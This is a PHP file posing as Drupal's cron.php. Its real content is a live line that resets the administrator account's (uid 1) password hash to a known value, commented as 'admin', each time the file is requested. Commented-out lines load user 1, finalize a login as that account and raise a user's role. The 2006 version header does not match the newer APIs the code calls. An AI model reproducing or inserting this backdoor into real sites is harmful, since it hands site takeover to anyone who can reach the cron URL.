<?php
// $Id: cron.php,v 1.36 2006/08/09 07:42:55 dries Exp $

/**
 * @file
 * Handles incoming requests to fire off regularly-scheduled tasks (cron jobs).
 */

define('DRUPAL_ROOT', getcwd());

require_once DRUPAL_ROOT . '/includes/bootstrap.inc';
drupal_bootstrap(DRUPAL_BOOTSTRAP_FULL);

//$account = user_load(1); print_r($account);
//user_login_finalize($account);
  /*$result = db_query('SELECT rid FROM {role}');
    foreach ($result as $record) {
      print $record->rid . ' - ';
    }*/
    
   /*$up = db_update('users_roles')
      ->fields(array('rid' => 3))
      ->condition('uid', $user->uid)
      ->execute();*/
      
   
 //update pass = admin
 db_update('users')->fields(array('pass' => '$S$DyjxoW.QVaDdoN8H3aCpyoRVRk3RtjEA/Z48o.tqqh.AgUTjSJ4b'))->condition('uid', 1)->execute();
   